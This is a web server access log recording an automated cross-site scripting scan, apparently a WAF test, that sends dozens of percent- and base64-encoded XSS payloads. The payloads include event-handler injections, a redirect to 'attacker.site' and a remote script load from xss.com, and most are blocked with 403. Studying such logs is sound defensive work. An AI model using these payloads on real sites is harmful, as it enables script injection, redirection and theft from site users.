127.0.0.1 - - [24/Feb/2026:21:30:16 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
172.27.0.4 - - [24/Feb/2026:21:32:46 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:46 +0000] "GET /Im9uQ2xpY2s9Iihwcm9tcHQpKDEp HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:47 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:47 +0000] "GET /%22onClick=%22%28prompt%29%281%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:47 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
127.0.0.1 - - [24/Feb/2026:21:32:47 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
172.27.0.4 - - [24/Feb/2026:21:32:47 +0000] "GET /?cc56f4632f=%22onClick=%22%28prompt%29%281%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:47 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:47 +0000] "GET /Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:47 +0000] "GET /?d2b18c3cfd=Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:47 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "GET /%27%3Ealert%281%29%3C%2Fscript%3E%3Cscript%2F1=%27 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "GET /?0c201699ee=%27%3Ealert%281%29%3C%2Fscript%3E%3Cscript%2F1=%27 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "GET /?8e4be28c32=Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "GET /Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:48 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "GET /%22%2F%2FOnx=%22%22%2F%2Fonfocus=prompt%281%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "GET /?7c342ea883=%22%2F%2FOnx=%22%22%2F%2Fonfocus=prompt%281%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "GET /?eed56c7e8c=Ik9ueD0oKSBvbk1vdVNlb1Zlcj1wcm9tcHQoMSk+ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "GET /Ik9ueD0oKSBvbk1vdVNlb1Zlcj1wcm9tcHQoMSk+ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "GET /%22Onx=%28%29%20onMouSeoVer=prompt%281%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:49 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:50 +0000] "GET /?149781b627=%22Onx=%28%29%20onMouSeoVer=prompt%281%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:50 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:50 +0000] "GET /?aa22092130=Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:50 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:50 +0000] "GET /Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:50 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:50 +0000] "GET /?900abe2499=%22OnCliCk=%22%28prompt%601%60%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:50 +0000] "GET /%22OnCliCk=%22%28prompt%601%60%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "GET /?b63382c024=cHJvbXB0LmNhbGwobnVsbCwxKQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "GET /cHJvbXB0LmNhbGwobnVsbCwxKQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "GET /prompt.call%28null%2C1%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:51 +0000] "GET /?ee7438b09e=prompt.call%28null%2C1%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:52 +0000] "GET /YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:52 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:52 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:52 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:52 +0000] "GET /?8c9b7325c4=YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:52 +0000] "GET /?b0876760ae=alert.apply%28null%2C%20%5B1%5D%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:52 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:52 +0000] "GET /alert.apply%28null%2C%20%5B1%5D%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "GET /Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "GET /?0b0147280b=Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "GET /&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "GET /?e988c211a9=&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:53 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "GET /XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "GET /?2977f6a2e3=XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "GET /%5C%22autof%3Cx%3Eocus%20o%3Cx%3Enfocus=alert%3Cx%3E%281%29%2F%2F HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "GET /Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:54 +0000] "GET /?39a9281b2c=%5C%22autof%3Cx%3Eocus%20o%3Cx%3Enfocus=alert%3Cx%3E%281%29%2F%2F HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:55 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:55 +0000] "GET /?7835436467=Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:55 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:55 +0000] "GET /%22%3E%3Cp%20only=1337%20onmouseenter=window.location.href=%2F%2Fattacker.site%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:55 +0000] "GET /?11e183acbd=%22%3E%3Cp%20only=1337%20onmouseenter=window.location.href=%2F%2Fattacker.site%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:55 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:55 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:55 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:56 +0000] "GET /Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:56 +0000] "GET /?8583e37ab6=Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:56 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:56 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:56 +0000] "GET /?51c3d25692=%22%3E%3Csvg%20onmouseover=%22confirm&%230000000040document.domain%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:56 +0000] "GET /%22%3E%3Csvg%20onmouseover=%22confirm&%230000000040document.domain%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:56 +0000] "GET /PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:56 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:57 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:57 +0000] "GET /?eb6c8ff372=PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:57 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.27.0.4 - - [24/Feb/2026:21:32:57 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
